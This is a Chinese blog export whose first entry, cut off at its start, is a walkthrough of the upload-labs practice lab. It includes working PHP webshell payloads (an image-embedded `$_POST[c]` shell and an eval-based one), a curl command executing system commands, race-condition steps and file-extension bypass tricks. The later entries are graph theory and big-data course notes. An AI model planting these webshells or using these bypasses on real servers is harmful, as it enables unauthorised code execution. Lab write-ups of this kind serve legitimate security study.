<p><img src="/2021/02/23/upload-labs学习笔记/payload-get-password-is-c.jpg" alt="payload-get-password-is-c"></p>
<p>上传后的图片为</p>
<p><img src="/2021/02/23/upload-labs学习笔记/get-after-upload.jpg" alt="get-after-upload"></p>
<p>效果图（图片名字改了）</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210121203513449.png" alt="image-20210121203513449"></p>
<p>我改了一下，可以接POST型的系统调用，原图片也只能用月球图片</p>
<p>这个图可以过二次渲染，内容是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?=`$_POST[c]`?&gt;</span><br></pre></td></tr></table></figure>
<p>使用命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X POST &quot;http://192.168.189.128/upload/include.php?file=19765.jpg&quot; -d &quot;c=dir&quot; -o result.txt</span><br></pre></td></tr></table></figure>
<p>图片马为</p>
<p><img src="/2021/02/23/upload-labs学习笔记/payload-post-password-is-c.jpg" alt="payload-post-password-is-c"></p>
<p>上传后的图片为</p>
<p><img src="/2021/02/23/upload-labs学习笔记/post-after-upload.jpg" alt="post-after-upload"></p>
<h1 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h1><p>提示要审计代码，看源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133354221.png" alt="image-20210122133354221"></p>
<p>他是先用move_uploaded_file函数上传，然后才检测是否合法，不合法就删除</p>
<p>我们可以用条件竞争，即在他还没删掉前去访问上传的writephp.php文件，从而让writephp.php解析一次，执行的内容是将一句话写入新文件info.php，然后info.php就被曲线救国“上传”成功了</p>
<p>writephp.php内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["x"]);?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要用burp的intruder模块，一个负责上传writephp.php，一个负责访问writephp.php</p>
<p>抓两个原始包，改一下</p>
<p>这个负责上传</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133736066.png" alt="image-20210122133736066"></p>
<p>这个负责访问</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133749429.png" alt="image-20210122133749429"></p>
<p>添加一个变量去爆破，payload设置如下</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133832312.png" alt="image-20210122133832312"></p>
<p>线程设置如下，都20个线程</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133901237.png" alt="image-20210122133901237"></p>
<p>然后开始爆破，下面是结果，左边上传，右边访问，访问的出现status=200就是成功访问到了（解析了，执行了）</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133946066.png" alt="image-20210122133946066"></p>
<p>然后看下upload文件夹，info.php成功制造</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122134052422.png" alt="image-20210122134052422"></p>
<p>完成</p>
<h1 id="Pass-18-条件竞争-apache解析漏洞"><a href="#Pass-18-条件竞争-apache解析漏洞" class="headerlink" title="Pass-18-条件竞争+apache解析漏洞"></a>Pass-18-条件竞争+apache解析漏洞</h1><p>需要先改下源码，Pass-18/index.php，添加 . ‘/‘  不然文件会传到WWW目录下而不是upload目录下</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180253314.png" alt="image-20210122180253314"></p>
<p>看提示是代码审计，允许的后缀是这些</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180840449.png" alt="image-20210122180840449"></p>
<p>去apache的config路径下看mime.types文件，发现apache对7z不识别，可以考虑用解析漏洞，传一个writephp.php.7z上去访问即可解析</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181043307.png" alt="image-20210122181043307"></p>
<p>看下面代码，其实也是条件竞争，但是我只一直发上传包也是可以上传成功的（文件名是writephp.php.7z），我估计是多个并发上传时哪里出了问题</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180806081.png" alt="image-20210122180806081"></p>
<p>分析一下爆破结果，包的结果有3种</p>
<ol>
<li>上传成功并重命名</li>
<li>上传成功但没有重命名</li>
<li>无法复制到目标目录</li>
</ol>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181443209.png" alt="image-20210122181443209"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181528157.png" alt="image-20210122181528157"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181540979.png" alt="image-20210122181540979"></p>
<p>没理解第一次成功的时候是怎么成功的。。</p>
<h1 id="Pass-19-自定义保存文件名-黑名单"><a href="#Pass-19-自定义保存文件名-黑名单" class="headerlink" title="Pass-19-自定义保存文件名+黑名单"></a>Pass-19-自定义保存文件名+黑名单</h1><p>上传文件，可以指定文件名，比如upload-19.jpg，那么试试保存为php行吗，发现不行</p>
<p>改下包，保存名改为phppng.php.7z，发现可以了，看来是对这个保存名进行黑名单限制</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192419835.png" alt="image-20210122192419835"></p>
<p>再试试发现连对传的文件内容都没限制，txt都行</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192405106.png" alt="image-20210122192405106"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192500262.png" alt="image-20210122192500262"></p>
<p>看下源码，确实，黑名单那一套都能拿来用，就不一一列举了</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192559769.png" alt="image-20210122192559769"></p>
<h1 id="Pass-20-POST定义关联数组"><a href="#Pass-20-POST定义关联数组" class="headerlink" title="Pass-20-POST定义关联数组"></a>Pass-20-POST定义关联数组</h1><p>审计源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123111436682.png" alt="image-20210123111436682"></p>
<p>理一下逻辑</p>
<ol>
<li>检查文件类型</li>
<li>save_name不为空，file取save_name，为空取upload_file的name</li>
<li>如果$file不是数组，就用explode将他按点打散成数组</li>
</ol>
<p>那么这里如果$file是一个数组，那就不用打散了，这是关键</p>
<p>我们可以控制save_name这个数组（关联数组）</p>
<p>继续往下看</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123112208759.png" alt="image-20210123112208759"></p>
<p>end(file)要求是jpg，png，gif</p>
<p>$file_name = reset($file) . $file[count($file)-1]，这里是把file当作数值数组来看待的，但如果file是关联数组，$file[count($file)-1]可以控制一下，比如</p>
<p>file[0] = whale</p>
<p>file[1]不传</p>
<p>file[2] = php</p>
<p>file[3] = jpg</p>
<p>这样的话，end(file) = jpg，count(file)=3，file[count-1] = file[2] = php，file_name = whale.php，就完事了</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113636206.png" alt="image-20210123113636206"></p>
<p>结果</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113706523.png" alt="image-20210123113706523"></p>
<p>参考这篇文章里的图</p>
<p><a href="https://xz.aliyun.com/t/4029#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-16</a></p>
<p><img src="/2021/02/23/upload-labs学习笔记/20190527142730-812f49fc-8048-1.png" alt="img"></p>
<p>和他的复现，他的思路是</p>
<p>file[0] = up.php/</p>
<p>file[1]为空</p>
<p>file[2] = jpg</p>
<p>然后拼接出来的文件名是 up.php/.</p>
<p>然后move_upload_file的时候会忽略 斜杠点，就可以传up.php了</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113500745.png" alt="image-20210123113500745"></p>
<p>结果</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113513439.png" alt="image-20210123113513439"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传，先看有无前端校验</p>
<p>然后看burp包的结构，以及页面结果</p>
<p>先试试传php，以及php的各种变体，php.aa，php.7z，PHP，php空格，php3，phtml，php::$DATA，php点空格点</p>
<p>传图片马，后缀为png的，copy出来的，真图片马</p>
<p>最后考虑条件竞争，代码审计等</p>
<p>附一张先知社区的图，来源 <a href="https://xz.aliyun.com/t/4029#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-12</a></p>
<p><img src="/2021/02/23/upload-labs学习笔记/20190527142723-7cd5273c-8048-1.png" alt="img"></p>
]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Upload</tag>
      </tags>
  </entry>
  <entry>
    <title>图论定理收集</title>
    <url>/2019/02/26/%E5%9B%BE%E8%AE%BA%E5%AE%9A%E7%90%86%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>参考书目：《图论与网络理论》和ppt</p>
<p>要求：复习的时候都会证明</p>
<h1 id="第一章-图的基本概念"><a href="#第一章-图的基本概念" class="headerlink" title="第一章 图的基本概念"></a>第一章 图的基本概念</h1><p>定理1.1.1 对任何图 $ G $ ，各顶点度数之和等于边数的2倍.即 $ \sum\limits_{\nu\in V(G)}d(\nu) = 2\varepsilon. $</p>
<p>推论1.1.1 任何图中，奇度顶点个数为偶数.</p>
<p>例1.1.2 设 $ G $ 是一个简单图，若最小度 $ \delta(G) \geq 2 $，则 $ G $ 中必含有圈.</p>
<p>例1.1.3 设 $ G $ 是一个简单图，若最小度 $ \delta(G) \geq 3 $，则 $ G $ 中必含有偶圈.</p>
<p>例1.1.4 设 $ G $ 是简单图，若最小度 $ \delta(G) \geq 3 $，则 $ G $ 中各个圈长的最大公因数是1或2.</p>
<p>定理1.1.2 一个图是二部图当且仅当它不含有奇圈.</p>
<p>定理1.1.3 如果图 $ G $ 连通，$ \varepsilon(G) \geq \nu(G)-1 $.</p>
<p>例1.1.6 设图 $ G $ 有 $ 2n $个顶点，$ \delta(G) \geq n $，求证 $ G $ 连通.</p>
<p>例1.1.7 求证：若图中有且仅有2个奇度顶点，则它们必然连通.</p>
<p>定理1.3.1<br>下列命题等价</p>
<ol>
<li>$ G $ 是树（无圈的连通图）.</li>
<li>$ G $ 无环边且 $ G $ 中任意两个顶点间有唯一的路.</li>
<li>$ G $ 无圈且 $ \varepsilon = v-1 $.</li>
<li>$ G $ 连通且 $ \varepsilon = v-1 $.</li>
<li>$ G $ 连通且对于任意 $ e \in E(G)$，$ G-e $ 不连通.</li>
<li>$ G $ 无圈且对于任意 $ e \in E(\overline{G}) $，$ G+e $ 恰有一个圈.</li>
</ol>
<hr>
<p>定理2.1.3 设 $ v $ 是树的顶点，则 $ v $ 是 $ T $ 的割点当且仅当 $ d(v)&gt;1 $.</p>
<p>推论2.1.1 每个非平凡无圈连通图至少有2个顶点不是割点.</p>
<p>定理2.1.5 边 $ e $ 是割边当且仅当 $ e $ 不在 $ G $ 的任何一个圈上.</p>
<p>定理2.2.1 $ \kappa(G) \leq \kappa’(G) \leq \delta(G) $</p>
<p>定理2.2.2 对具有 $ v $ 个顶点 $ \varepsilon $，有$ \kappa(G) \leq \lfloor \frac{2\varepsilon}{v} \rfloor $.</p>
<p>定理2.2.3 设 $ G $ 是一个简单图，$ k $ 是一个自然数，若$ \delta(G) \geq \frac{v+k+2}{2} $，则 $ G $ 是连通的.</p>
<p>推论2.2.1 设 $ G $ 是一个简单图，若 $ \delta(G) \geq \frac{v-1}{2} $，则 $ G $ 是连通图。</p>
<p>定理2.2.4 设 $ G $ 是一个直径为2的简单图，则 $ \kappa’(G)=\delta(G) $.</p>
<h1 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h1><h2 id="中国邮递员问题-gt-带权最短闭途径"><a href="#中国邮递员问题-gt-带权最短闭途径" class="headerlink" title="中国邮递员问题-&gt;带权最短闭途径"></a>中国邮递员问题-&gt;带权最短闭途径</h2><p>Edmonds-Johnson 算法（补成欧拉图）</p>
<ol>
<li>找出奇度顶点，拉出来</li>
<li>画一个完全图，需要找两两之间最短路</li>
<li>找最小权匹配</li>
<li>在原来的图中添边</li>
</ol>
<p>Fleury 算法（找欧拉闭迹）</p>
<ul>
<li>沿着图的非割边前行</li>
</ul>
<h1 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h1><h2 id="支配集"><a href="#支配集" class="headerlink" title="支配集"></a>支配集</h2><p>支配数 $ \gamma(G) $</p>
<p>支配周围的点</p>
<p>极小支配集的补集也是支配集</p>
<h2 id="点独立集"><a href="#点独立集" class="headerlink" title="点独立集"></a>点独立集</h2><p>点独立数 $ \alpha(G) $</p>
<p>任二顶点有 d(u)+d(v) &gt;= v(G)，则 a &lt; gamma</p>
<h2 id="点覆盖集"><a href="#点覆盖集" class="headerlink" title="点覆盖集"></a>点覆盖集</h2><p>覆盖了所有的边</p>
<h2 id="边覆盖集"><a href="#边覆盖集" class="headerlink" title="边覆盖集"></a>边覆盖集</h2><p>覆盖了所有的顶点</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Graph Theory</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据与并行计算复习笔记</title>
    <url>/2020/08/08/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8E%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ch1-概论"><a href="#ch1-概论" class="headerlink" title="ch1 概论"></a>ch1 概论</h1><h2 id="需要掌握的问题"><a href="#需要掌握的问题" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>为什么需要并行计算？</li>
<li>提高计算性能的方法？</li>
<li>上述方法的瓶颈是什么？</li>
<li>并行计算技术的分类</li>
<li>并行加速评估公式 Amdahl 公式</li>
<li>MPI 主要功能</li>
<li>MPI 的优点和缺点</li>
<li>MapReduce的三种理解是什么</li>
</ol>
<h2 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h2><h3 id="1-为什么需要并行计算？"><a href="#1-为什么需要并行计算？" class="headerlink" title="1. 为什么需要并行计算？"></a>1. 为什么需要并行计算？</h3><p>web规模爆炸增加</p>
<p>计算量和计算复杂度增加，比如电影渲染</p>
<h3 id="2-曾经的提高计算性能的方法？"><a href="#2-曾经的提高计算性能的方法？" class="headerlink" title="2. 曾经的提高计算性能的方法？"></a>2. 曾经的提高计算性能的方法？</h3><ol>
<li>处理器字长变长</li>
<li>提高集成度</li>
<li>微体系结构技术，如流水线，乱序发射</li>
<li>提高处理器频率（CPU主频）</li>
</ol>
<h3 id="3-上述方法的瓶颈"><a href="#3-上述方法的瓶颈" class="headerlink" title="3. 上述方法的瓶颈"></a>3. 上述方法的瓶颈</h3><ol>
<li>集成度到极限了，受制于芯片制作工艺</li>
<li>微体系指令并行技术到极限了，ILP墙</li>
<li>处理器速度与存储器速度不匹配，存储墙</li>
<li>功耗和散热限制了处理器速度，功耗墙</li>
</ol>
<h3 id="4-并行计算技术的分类"><a href="#4-并行计算技术的分类" class="headerlink" title="4. 并行计算技术的分类"></a>4. 并行计算技术的分类</h3><ol>
<li>按数据和指令类型分（弗林分类）</li>
<li>按并行类型</li>
<li>按存储访问结构</li>
<li>按计算特征</li>
<li>按系统特征</li>
<li>按并行程序设计模型/方法</li>
</ol>
<p>弗林分类：SISD, SIMD, MISD, MIMD，用的最多的是MIMD</p>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200808115717945.png" alt="image-20200808115717945"></p>
<p>并行类型</p>
<ul>
<li>bit级并行</li>
<li>指令级并行（ILP: instruction-level parallelism</li>
<li>线程级并行<ul>
<li>数据级并行：大数据块切成小数据块</li>
<li>任务级并行：大任务切成子任务</li>
</ul>
</li>
</ul>
<p>按存储访问结构</p>
<ul>
<li>共享内存，也称UMA，uniform memory acess</li>
<li>分布式共享存储，每个处理器有自己的本地存储器，再共享一个全局存储器</li>
<li>分布式内存，每个处理器有自己的本地存储器，无全局存储器</li>
</ul>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200808120105679.png" alt="image-20200808120105679"></p>
<p>按系统类型分</p>
<ul>
<li>多核处理器MC</li>
<li>对称多处理系统 SMP：symmetric multiprocessing</li>
<li>大规模并行处理 MPP：massive multiprocessing</li>
<li>集群cluster</li>
<li>网格grid：异构计算机</li>
</ul>
<p>按计算特征分：</p>
<ul>
<li>数据密集型：web搜索</li>
<li>计算密集型：天气预报，一大堆矩阵运算</li>
<li>混合型：3d电影渲染</li>
</ul>
<p>按并行程序设计模型/方法：</p>
<ul>
<li>共享内存变量：Pthread，OpenMP</li>
<li>消息传递方式：MPI</li>
<li>mapreduce</li>
</ul>
<h3 id="5-并行加速评估公式-Amdahl-公式"><a href="#5-并行加速评估公式-Amdahl-公式" class="headerlink" title="5. 并行加速评估公式 Amdahl 公式"></a>5. 并行加速评估公式 Amdahl 公式</h3><p>设S为加速比，P为程序中可并行的比例，N是处理器数量</p>
<p>$S = \frac{1}{(1-P)+\frac{P}{N}}$</p>
<h3 id="6-MPI主要功能"><a href="#6-MPI主要功能" class="headerlink" title="6. MPI主要功能"></a>6. MPI主要功能</h3><p>message passing interface，消息传递接口</p>
<p>计算密集型任务，所有节点运行同一个程序，但数据不同</p>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200808235228378.png" alt="image-20200808235228378"></p>
<h3 id="7-MPI-优点和缺点"><a href="#7-MPI-优点和缺点" class="headerlink" title="7. MPI 优点和缺点"></a>7. MPI 优点和缺点</h3><p>优点：</p>
<ol>
<li>适合计算密集型任务</li>
<li>有独立于语言外的标准，可移植性好</li>
<li>有很多开放机构和厂商提供支持</li>
</ol>
<p>缺点：</p>
<ol>
<li>没有数据划分和任务划分</li>
<li>通信开销大</li>
<li>无分布式文件系统支撑</li>
<li>无错误恢复机制，一个节点计算失效可能导致所有结果无效</li>
<li>无良好架构，程序员需要考虑复杂的细节</li>
</ol>
<h3 id="8-MapReduce的三种理解是什么？"><a href="#8-MapReduce的三种理解是什么？" class="headerlink" title="8. MapReduce的三种理解是什么？"></a>8. MapReduce的三种理解是什么？</h3><ol>
<li>基于集群的高性能并行计算平台</li>
<li>并行程序开发与运行框架：自动完成任务的并行化处理、自动划分数据、数据通信、错误恢复等等</li>
<li>并行程序设计模型与方法：函数式编程思想，用两个函数完成基本的并行计算任务</li>
</ol>
<h1 id="ch2-MapReduce-简介"><a href="#ch2-MapReduce-简介" class="headerlink" title="ch2 MapReduce 简介"></a>ch2 MapReduce 简介</h1><h2 id="需要掌握的问题-1"><a href="#需要掌握的问题-1" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>mapper，combiner，partitionner，reducer的关系</li>
<li>MapReduce的优点</li>
</ol>
<h2 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h2><h3 id="1-mapper，combiner，partitionner，reducer的关系"><a href="#1-mapper，combiner，partitionner，reducer的关系" class="headerlink" title="1. mapper，combiner，partitionner，reducer的关系"></a>1. mapper，combiner，partitionner，reducer的关系</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200809152940591.png" alt="image-20200809152940591"></p>
<h3 id="2-MapReduce-的优点"><a href="#2-MapReduce-的优点" class="headerlink" title="2. MapReduce 的优点"></a>2. MapReduce 的优点</h3><p>提供了统一的计算框架</p>
<ul>
<li>划分数据和任务、出错恢复、数据通信、负载均衡等等</li>
</ul>
<p>提供了抽象的程序模型</p>
<ul>
<li>map函数和reduce函数，把做什么和怎么做区分开</li>
</ul>
<p>平滑的可扩展性</p>
<ul>
<li>用的集群是普通商用机，可扩展性好，性能可以随处理器数量线性增长</li>
</ul>
<p>把处理向数据迁移</p>
<ul>
<li>处理器先处理本地磁盘的数据，处理不了时再用就近原则把数据传输去附近的计算节点上算</li>
</ul>
<h3 id="3-Google-MapReduce-基本工作流程"><a href="#3-Google-MapReduce-基本工作流程" class="headerlink" title="3. Google MapReduce 基本工作流程"></a>3. Google MapReduce 基本工作流程</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200810095325815.png" alt="image-20200810095325815"></p>
<ol>
<li>拥有的输入：数据块切分为大小相同的数据块比如64MB，以及对应用户程序</li>
<li>用户程序提交给master节点</li>
<li>master节点寻找配置map节点和reduce节点，把数据和程序给map节点，把程序给reduce节点</li>
<li>map节点优先从本地读取数据计算，并且做一些整理排序的任务，中间结果输出到本地，并且告知master计算已完成、和中间结果的存储位置</li>
<li>reduce从存储位置中远程读中间结果，进行计算，输出到结果文件</li>
</ol>
<h3 id="4-MapReduce失效处理"><a href="#4-MapReduce失效处理" class="headerlink" title="4. MapReduce失效处理"></a>4. MapReduce失效处理</h3><p>主节点：定期设置计算任务的checkpoint，如果发现失效，恢复到最近的checkpoint继续执行</p>
<p>工作节点：经常失效，主节点会发心跳包，假如没有回复，主节点把任务调度给其他节点并终止失效的工作节点</p>
<h3 id="5-MR带宽优化"><a href="#5-MR带宽优化" class="headerlink" title="5. MR带宽优化"></a>5. MR带宽优化</h3><p>大量键值对在从map端中间结果，远程传输到reduce节点时会占用很大带宽，可以用combiner整合key相同的键值对，降低带宽占用</p>
<h3 id="6-MR计算优化"><a href="#6-MR计算优化" class="headerlink" title="6. MR计算优化"></a>6. MR计算优化</h3><p>reduce节点需要等所有map节点算完后才能开始运行，所以如果有一个map很慢，拖后腿了，那会大幅降低性能，所以可以安排多个map节点同时算，取那个算得最快的</p>
<h3 id="7-MR数据分区"><a href="#7-MR数据分区" class="headerlink" title="7. MR数据分区"></a>7. MR数据分区</h3><p>reduce的输入可能来自多个map端，所以需要先用partitioner进行分区，把属于同一个reduce的数据聚到一起，解决数据相关性问题</p>
<h3 id="8-GFS的设计理念"><a href="#8-GFS的设计理念" class="headerlink" title="8. GFS的设计理念"></a>8. GFS的设计理念</h3><ul>
<li><p>廉价的本地磁盘分布存储</p>
</li>
<li><p>多数据自动备份解决可靠性</p>
</li>
<li><p>为MapReduce框架提供支持</p>
</li>
</ul>
<h3 id="9-GFS基本架构是什么"><a href="#9-GFS基本架构是什么" class="headerlink" title="9. GFS基本架构是什么"></a>9. GFS基本架构是什么</h3><p>用户-master节点-多个server</p>
<p>master节点存储3种元数据</p>
<ul>
<li>GFS的目录结构（日志恢复）</li>
<li>文件名和chunk的映射表（日志恢复）</li>
<li>chunk副本的位置信息，默认3个副本（master启动或server注册时生成）</li>
</ul>
<p>一个chunk是64MB，数据更新只有3个副本都更新成功时才认为成功</p>
<p>chunk再切分为64KB的子块，物理上存在linux文件系统里</p>
<h3 id="10-用户在访问GFS文件时工作过程是什么"><a href="#10-用户在访问GFS文件时工作过程是什么" class="headerlink" title="10. 用户在访问GFS文件时工作过程是什么"></a>10. 用户在访问GFS文件时工作过程是什么</h3><p>用户告诉master：文件名或者chunk索引</p>
<p>master查目录，告诉用户对应文件或chunk在哪些server上</p>
<p>用户直接访问server，读取数据</p>
<blockquote>
<p>这样绕过了master读取实际数据，可以避免master成为瓶颈</p>
</blockquote>
<h3 id="11-GFS用到的技术"><a href="#11-GFS用到的技术" class="headerlink" title="11. GFS用到的技术"></a>11. GFS用到的技术</h3><ul>
<li>大规模集群安装</li>
<li>故障检测和恢复</li>
<li>动态添加新节点</li>
<li>节能技术：蓄电池，而非UPS</li>
</ul>
<h3 id="12-分布式数据表-BigTable-的设计目标"><a href="#12-分布式数据表-BigTable-的设计目标" class="headerlink" title="12. 分布式数据表 BigTable 的设计目标"></a>12. 分布式数据表 BigTable 的设计目标</h3><p>广泛的实用性：存储不同类型数据</p>
<p>很强的可扩展性：新增服务器节点</p>
<p>容错性和高可用性</p>
<p>高吞吐量：PB级</p>
<p>自动管理</p>
<p>简单</p>
<h3 id="13-BT的架构是什么样"><a href="#13-BT的架构是什么样" class="headerlink" title="13. BT的架构是什么样"></a>13. BT的架构是什么样</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200810172334336.png" alt="image-20200810172334336"></p>
<p>主服务器-子表服务器</p>
<p>子表服务器上用SSTable存子表</p>
<ul>
<li>一个SSTable有64KB大，存在GFS中</li>
<li>一个GFS Chunk中可存1000+个子块，需要索引</li>
<li>SSTable可以被不同子表共享，避免重复数据</li>
<li>子表寻址：由chubby服务器找到根子表，再查二级索引子表，再访问到具体SSTable</li>
</ul>
<h3 id="14-BT的数据模型是什么样"><a href="#14-BT的数据模型是什么样" class="headerlink" title="14. BT的数据模型是什么样"></a>14. BT的数据模型是什么样</h3><p>行：行关键字</p>
<p>列：族名+列名</p>
<p>时间戳：比如网页数据跟随时间变化</p>
<h3 id="15-Hadoop-MapReduce-的架构"><a href="#15-Hadoop-MapReduce-的架构" class="headerlink" title="15. Hadoop MapReduce 的架构"></a>15. Hadoop MapReduce 的架构</h3><p>把google mr里的master节点改名叫JobTracker节点，worker节点改名TaskTracker节点</p>
<h3 id="16-Hadoop的一些组件"><a href="#16-Hadoop的一些组件" class="headerlink" title="16. Hadoop的一些组件"></a>16. Hadoop的一些组件</h3><p>InputFormat：决定读文件的格式，包括TextInputFormat、KeyValueInputFormat等</p>
<p>InputSplit：记录数据分块，64MB为一块这样</p>
<p>RecordReader：记录如何读取一块，LineRecordReader就是按行读，key为行号，value为行内容</p>
<p>TextOutputFormat：输出文件的格式</p>
<h3 id="17-HDFS-和-GFS-的联系"><a href="#17-HDFS-和-GFS-的联系" class="headerlink" title="17. HDFS 和 GFS 的联系"></a>17. HDFS 和 GFS 的联系</h3><p>NameNode对应master节点</p>
<p>DataNode对应server</p>
<h1 id="ch4-Hadoop环境配置和开发"><a href="#ch4-Hadoop环境配置和开发" class="headerlink" title="ch4 Hadoop环境配置和开发"></a>ch4 Hadoop环境配置和开发</h1><h2 id="需要掌握的问题-2"><a href="#需要掌握的问题-2" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>hadoop配置文件</li>
</ol>
<h2 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h2><h3 id="1-hadoop配置文件"><a href="#1-hadoop配置文件" class="headerlink" title="1. hadoop配置文件"></a>1. hadoop配置文件</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200811230439134.png" alt="image-20200811230439134"></p>
<h1 id="ch5-MapReduce-算法设计"><a href="#ch5-MapReduce-算法设计" class="headerlink" title="ch5 MapReduce 算法设计"></a>ch5 MapReduce 算法设计</h1><h2 id="需要掌握的问题-3"><a href="#需要掌握的问题-3" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>结论：大数据集上的简单算法能比小数据集上的复杂算法结果更好</li>
<li>自定义kv类型时重写的接口和继承类</li>
<li>mr全局排序中，如何有效划分数据</li>
<li>单词同现算法，如果neighbour的范围是一篇文档，要如何构造InputFormat呢？</li>
<li>web搜索服务，分为哪三步</li>
<li>带全局排序的倒排索引</li>
</ol>
<h2 id="回答-3"><a href="#回答-3" class="headerlink" title="回答"></a>回答</h2><h3 id="1-结论：大数据集上的简单算法能比小数据集上的复杂算法结果更好"><a href="#1-结论：大数据集上的简单算法能比小数据集上的复杂算法结果更好" class="headerlink" title="1. 结论：大数据集上的简单算法能比小数据集上的复杂算法结果更好"></a>1. 结论：大数据集上的简单算法能比小数据集上的复杂算法结果更好</h3><h3 id="2-自定义kv类型时重写的接口和继承类"><a href="#2-自定义kv类型时重写的接口和继承类" class="headerlink" title="2. 自定义kv类型时重写的接口和继承类"></a>2. 自定义kv类型时重写的接口和继承类</h3><h3 id="3-mr全局排序中，如何有效划分数据"><a href="#3-mr全局排序中，如何有效划分数据" class="headerlink" title="3. mr全局排序中，如何有效划分数据"></a>3. mr全局排序中，如何有效划分数据</h3><p>TotalOrderPartitioner</p>
<h3 id="4-单词同现算法，如果neighbour的范围是一篇文档，要如何构造InputFormat呢？"><a href="#4-单词同现算法，如果neighbour的范围是一篇文档，要如何构造InputFormat呢？" class="headerlink" title="4. 单词同现算法，如果neighbour的范围是一篇文档，要如何构造InputFormat呢？"></a>4. 单词同现算法，如果neighbour的范围是一篇文档，要如何构造InputFormat呢？</h3><p>自定义一个MyInputFormat，extends FileInputFormat，重写getSplits和getRecordReader方法，指定不拆分文件，然后在driver端设置InputFormat为自定义的</p>
<h3 id="5-web搜索服务，分为哪三步"><a href="#5-web搜索服务，分为哪三步" class="headerlink" title="5. web搜索服务，分为哪三步"></a>5. web搜索服务，分为哪三步</h3><ol>
<li>爬取网页内容</li>
<li>建立倒排索引</li>
<li>根据搜索内容返回排好序的网页</li>
</ol>
<h3 id="6-带全局排序的倒排索引"><a href="#6-带全局排序的倒排索引" class="headerlink" title="6. 带全局排序的倒排索引"></a>6. 带全局排序的倒排索引</h3><p>map in: <docid id,="" doc=""></docid></p>
<p>map out: &lt;(term, docid), f(term)&gt;</p>
<p>partitioner: 自定义MyPartitioner，extends HashPartitioner，重写getPartition方法，在driver中setPartitionerClass(MyPartitioner)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MyPartitioner extends HashPartitioner&lt;K, V&gt; &#123;</span><br><span class="line">	getPartitioner(K key, V value, int numReduceTasks) &#123;</span><br><span class="line">		term = key.split(&apos;#&apos;)[0];</span><br><span class="line">		super.getPartition(term, value, numReduceTasks);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>reduce:</p>
